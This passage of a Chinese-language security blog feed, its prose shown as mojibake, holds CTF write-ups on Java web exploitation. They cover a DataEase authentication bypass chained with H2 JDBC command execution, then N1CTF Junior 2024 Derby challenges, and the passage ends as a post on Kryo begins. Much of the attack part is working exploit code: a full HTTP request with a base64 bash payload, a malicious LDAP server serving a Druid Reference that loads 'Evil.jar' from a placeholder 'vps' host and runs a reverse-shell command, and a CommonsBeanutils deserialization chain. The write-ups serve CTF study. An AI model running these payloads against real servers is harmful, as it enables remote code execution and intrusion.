src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806170212126.png" alt="image-20250806170212126"></p><p>è¿™é‡Œä¼šæŠŠä¼ å…¥çš„è·¯å¾„æ”¾åˆ°æ­¤å¤„å¤„ç†ï¼Œè€Œå¤„ç†çš„é€»è¾‘ä¼šå¿½ç•¥ <code>;</code>å’Œ<code>/</code>ä¹‹é—´çš„å†…å®¹ï¼ŒåŒ…æ‹¬<code>;</code>ï¼Œå¦‚æœ <code>;</code>åé¢æ²¡æœ‰ä¸‹ä¸€ä¸ª<code>/</code>åˆ™å¿½ç•¥ä¹‹åæ‰€æœ‰å†…å®¹ã€‚</p><p>ä¾‹å¦‚ <code>/aaa;bbb/cccc;dddd</code>ä¼ å…¥è¯¥å‡½æ•°åä¼šè¿”å› <code>/aaa/ccc</code>ã€‚å¦‚æœä¸æ¸…æ¥šè‡ªå·±æœ¬åœ°è°ƒä¸€ä¸‹å°±çŸ¥é“äº†ã€‚</p><p>æ‰€ä»¥è¿™é‡Œçš„bypasså°±æœ‰æ€è·¯äº†ï¼Œå¯ä»¥çœ‹åˆ°è®¤è¯filteré™¤äº†ç™½åå•è·¯ç”±å¯ä»¥æ— éœ€è®¤è¯å¤–ï¼Œå¦‚æœæ»¡è¶³ä¸å«<code>/</code>å’Œä¸”å«<code>.</code>çš„è¦æ±‚ï¼Œä¹Ÿå¯ä»¥æ— éœ€è®¤è¯çš„ã€‚</p><p>é‚£ä¹ˆç»“åˆè¿™é‡Œå¯¹ä¼ å…¥è·¯å¾„çš„å¤„ç†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è®¿é—®çš„è·¯å¾„åé¢åŠ å…¥<code>;.</code>å³å¯ç»•è¿‡è®¤è¯ã€‚</p><p>ä»¥åŠå¦‚æœç¿»åˆ°å®ƒè‡ªå·±çš„ä¸€ä¸ªgithub commitä¹Ÿèƒ½çŸ¥é“ä¸ªå¤§æ¦‚æ€è·¯äº†ï¼š<a href="https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6">fix: ã€æ¼æ´ã€‘Dataease H2 JDBC RCE Bypass Â· dataease&#x2F;dataease@dd35752 Â· GitHub</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806171712599.png" alt="image-20250806171712599"></p><p>åç»­å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¸¸è§„jdk17-h2-rceï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html">æ‰’ä¸€æ‰’h2databaseè¿œç¨‹ä»£ç æ‰§è¡Œ | ç¦»åˆ«æ­Œ</a></p><p>æ³¨æ„ç¯å¢ƒæ˜¯jdk17ï¼Œç”±äºé«˜ç‰ˆæœ¬JDKå¤±å»äº†Nashornï¼Œäºæ˜¯éœ€è¦é€šè¿‡éjavascriptçš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥ç”¨JavaScriptå¼•æ“å°±ä¸è¡Œäº†ã€‚</p><p>è¿˜æœ‰æ³¨æ„ä¼ å…¥çš„jdbcUrlæ‹¼æ¥äº†ä¸€ä¸ª<code>;FORBID_CREATION=TRUE</code> è¿™ä¸ªä½œç”¨æ˜¯é™åˆ¶ç¦æ­¢åˆ›å»ºæ•°æ®åº“ï¼Œä½¿æˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨In-Memoryå†…å­˜æ•°æ®åº“ï¼Œå› ä¸ºä½¿ç”¨å†…å­˜æ•°æ®åº“ä¹Ÿæ˜¯åœ¨â€œåˆ›å»ºâ€æ•°æ®åº“ã€‚</p><p>å‚è€ƒpç‰›çš„blogï¼Œå¯çŸ¥å¦‚æœ<strong>å°†åˆ†å·ä½¿ç”¨åæ–œçº¿è½¬ä¹‰ï¼Œåˆ†å·å°±ä¼šå˜æˆä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²</strong>ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åœ¨JDBC URLå­—ç¬¦ä¸²æœ€æœ«å°¾åŠ ä¸€ä¸ªåæ–œæ <code>\</code>ï¼Œç”¨äºè½¬ä¹‰<code>;FORBID_CREATION=TRUE</code>æœ€å‰é¢çš„åˆ†å·ï¼Œå°±è®©è¿™ä¸ªå±æ€§å¤±æ•ˆäº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;INIT=CREATE ALIAS EXEC AS <span class="hljs-string">&#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;</span>\;CALL <span class="hljs-title function_">EXEC</span> <span class="hljs-params">(<span class="hljs-string">&#x27;calc&#x27;</span>)</span>\;;AUTHZPWD=\<br></code></pre></td></tr></table></figure><p>é¶æœºä¸å‡ºç½‘ï¼Œæ²¡æ³•åå¼¹shellï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤å¹¶å†™åˆ°åˆ°webappsä¸‹çš„jspæ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥å†™ğŸã€‚æ¯”å¦‚å†™åˆ°404.jspè¿™ç§ï¼Œå®˜æ–¹å°±è¿™ä¹ˆåšçš„ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/testConnect;.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">X-Authorization</span><span class="hljs-punctuation">: </span>whoami<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;INI\T=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ALIAS</span> EXEC <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;</span>\;<span class="hljs-keyword">CALL</span> EXEC (<span class="hljs-string">&#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)\;;AUTHZPWD=\</span><br></code></pre></td></tr></table></figure><p>base64æ•°æ®ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag &gt; <span class="hljs-variable">$CATALINA_HOME</span>/webapps/ROOT/404.jsp<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸€ä¸ªå¾ˆå·§å¦™çš„åˆ©ç”¨$CATALINA_HOMEç¡®å®štomcatçš„æ ¹ç›®å½•trickå€¼å¾—å­¦ä¸€ä¸‹hhh</p><p>å‚è€ƒï¼š</p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/bkp6ldnifm2k3o1a#cC8ZK">DASCTF2025 ä¸ŠåŠå¹´èµ›å®˜æ–¹WP</a></p><p><a href="https://mp.weixin.qq.com/s/laMT4-M00t8xAY_Autdb3A?poc_token=HJIak2ijkpleIzCX6uJ4XIKHq6BgywZs9V-dSD_9">2025-DASCTF 2025ä¸ŠåŠå¹´èµ›-æ³½è¥¿å²›</a></p><p><a href="https://blog.csdn.net/taiyangdao/article/details/81979971">Jerseyçš„Filterè¯¦è§£_jersey é…ç½®filter-CSDNåšå®¢</a></p><h2 id="N1CTF-Junior2024-Derby-Derby-Plus"><a href="#N1CTF-Junior2024-Derby-Derby-Plus" class="headerlink" title="N1CTF-Junior2024-Derby&amp;Derby Plus"></a>N1CTF-Junior2024-Derby&amp;Derby Plus</h2><p>ä¹Ÿæ˜¯çªç„¶æƒ³èµ·æ¥äº†æœ‰è¿™ä¹ˆä¸€ä¸ªæ¯”èµ›ï¼Œå½“æ—¶æ²¡æ—¶é—´çœ‹ï¼Œç°åœ¨ä¹Ÿæ²¡å•¥äº‹å¹²ï¼Œå°±å¤ç°å¤ç°å§ã€‚X1å“¥å‡ºçš„é¢˜ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚</p><p>æ‰“æ³•ä¹Ÿæ˜¯å¾ˆå®¹æ˜“èƒ½æœåˆ°ï¼Œé™„ä»¶ä¹Ÿç›´æ¥ç»™å‡ºäº†ä¸€ä¸ªlookupï¼Œä¸éš¾æƒ³åˆ°è¦ç”¨JNDIçš„æ–¹å¼æ¥å®ç°RCEï¼Œåªä¸è¿‡ç‰ˆæœ¬æ˜¯jdk17ï¼Œæ‰€ä»¥æƒ³ç›´æ¥æ‰“TemplatesImplè¿™ç§è‚¯å®šä¸è¡Œäº†ã€‚</p><p>ä¾èµ–ç»™äº†Druid, å¯ä»¥ä½¿ç”¨<code>DruidDataSourceFactory</code> å°†JNDIæ³¨å…¥è½¬åŒ–ä¸ºæ‰“JDBCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>        <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>        <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc.exe)\n&quot;</span> +<br>        <span class="hljs-string">&quot;$$\n&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>, JDBC_URL));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>, JDBC_USER));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>, JDBC_PASSWORD));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>));<br></code></pre></td></tr></table></figure><p>èƒ½æœåˆ°çš„æ–¹æ³•åˆ™æ˜¯åˆ©ç”¨çš„H2æ‰“JDBCé‚£ç§æ“ä½œï¼Œä½†æ˜¯é™„ä»¶å¹¶æ²¡æœ‰ç»™å‡ºH2ä¾èµ–ï¼Œæ‰€ä»¥éœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚é€šè¿‡æœç´¢æ–‡ç« çŸ¥é“ï¼ŒDerby SQLå¯ä»¥åŠ è½½è¿œç¨‹jar, å¹¶ä¸”è°ƒç”¨jarå†…çš„æ–¹æ³•, é‚£æˆ‘ä»¬å°±å¯ä»¥ç¼–è¯‘ä¸€ä¸ªæ¶æ„jaræ”¾vpsä¸Šï¼Œç„¶åè®©Derby SQLåŠ è½½æˆ‘ä»¬çš„è¿œç¨‹æ¶æ„jarï¼Œä»è€ŒRCEã€‚</p><p>æ‰§è¡ŒSQLçš„ç‚¹éœ€è¦å®¡è®¡ï¼Œè¿™é‡Œç”¨çš„æ˜¯ä¸€ä¸ª<code>initConnectionSqls</code>å‚æ•°ï¼š</p><p>ä½†è¿™äº›å‚æ•°å¹¶ä¸æ˜¯åƒH2å†™åœ¨JDBC URLé‡Œ, è€Œæ˜¯è·Ÿä¸Šé¢çš„<code>driverClassName, url, username, password</code>ä¸€æ ·, å†™åœ¨<code>StringRefAddr</code>é‡Œã€‚</p><p>Derby Plusä¸è¿‡æ˜¯æ²¡ç»™lookupï¼Œåªç»™äº†ååºåˆ—åŒ–æ¥å£ï¼Œæ­¤å¤„é€šè¿‡CBä¾èµ–å¯ä»¥ç”¨CBé“¾è§¦å‘ï¼Œç„¶åä½¿ç”¨<code>LdapAttribute</code>äººä¸ºæä¸€ä¸ªJNDIè®¿é—®ã€‚</p><h3 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>());<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                list.add(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://vps:port1/Evil.jar&#x27;, &#x27;APP.Evil&#x27;, 0)&quot;</span>);<br>                list.add(<span class="hljs-string">&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Evil&#x27;)&quot;</span>);<br>                list.add(<span class="hljs-string">&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;&quot;</span>);<br>                list.add(<span class="hljs-string">&quot;CALL cmd(&#x27;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>);<br><br>                <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;jdbc:derby:webdb;create=true&quot;</span>));<br>                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>));<br>                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>));<br>                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initConnectionSqls&quot;</span>, String.join(<span class="hljs-string">&quot;;&quot;</span>, list)));<br><br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, SerializeUtil.serialize(ref));<br><br>                result.sendSearchEntry(e);<br>                result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>            &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20251025004824068.png" alt="image-20251025004824068"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp_Plus</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;name&quot;</span>);<br><br>        setFieldValue(obj, <span class="hljs-string">&quot;baseCtxURL&quot;</span>, <span class="hljs-string">&quot;ldap://vps:port2/&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;rdn&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a/b&quot;</span>));<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        beanComparator.setProperty(<span class="hljs-string">&quot;attributeDefinition&quot;</span>);<br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(priorityQueue)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20251025004806860.png" alt="image-20251025004806860"></p><p>éš¾åº¦ä¸ç®—å¤ªé«˜ï¼Œå°±æ˜¯æ‰¾<code>initConnectionSqls</code>è¿™ç§å¯ç”¨å‚æ•°çš„æ—¶å€™è´¹ç‚¹åŠ²ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/#derby">N1CTF Junior 2024 Web Official Writeup - X1r0z Blog</a></p><p><a href="https://blog.csdn.net/weixin_45446164/article/details/136047181">ç¬¬äºŒå±ŠN1CTF Web Derby wp jndiæ³¨å…¥é€šè¿‡Druidç»•è¿‡é«˜ç‰ˆæœ¬jdkæ‰“Derby Rce_ctf jndi-CSDNåšå®¢</a></p><p><a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">derbyæ•°æ®åº“å¦‚ä½•å®ç°RCE - lvyyevdâ€™s å®‰å…¨åšå®¢</a></p><p>ï¼ˆæœªå®Œå¾…ç»­â€¦.ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kryo</title>
    <link href="/2024/08/14/Kyro/"/>
    <url>/2024/08/14/Kyro/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¥æƒ³ç¼“ä¸¤å¤©å†å†™Hessiançš„ï¼Œä½†æ˜¯è¢«å·åˆ°äº†emmmã€‚</p><p>è®¨åŒå·ç‹—ã€‚</p><p>Hessianå¤ªå¤šäº†ï¼Œä¸€æ¬¡å†™ä¸å®Œçš„ï¼Œé‚£æˆ‘è¿™æ¬¡å°±å†™å†™Kryoå§ï¼Œä¸‹æ¬¡å†™è¡¨è¾¾å¼æ³¨å…¥SSTIä¹‹ç±»çš„ï¼ŒHessiané¥é¥æ— æœŸäº†hhhhã€‚</p><p>Kryo æ˜¯ä¸€ä¸ªå¿«é€Ÿåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å·¥å…·ï¼Œä¾èµ–äºå­—èŠ‚ç ç”Ÿæˆæœºåˆ¶ï¼ˆåº•å±‚ä½¿ç”¨äº† ASM åº“)ï¼Œå› æ­¤åœ¨åºåˆ—åŒ–é€Ÿåº¦ä¸Šæœ‰ä¸€å®šçš„ä¼˜åŠ¿ï¼Œä½†æ­£å› å¦‚æ­¤ï¼Œå…¶ä½¿ç”¨ä¹Ÿåªèƒ½é™åˆ¶åœ¨åŸºäº JVM çš„è¯­è¨€ä¸Šï¼ˆScalaã€Kotlinï¼‰</p><p>å…¶ä»–ç±»ä¼¼çš„åºåˆ—åŒ–å·¥å…·ï¼šåŸç”ŸJDKã€Hessianã€FTS</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 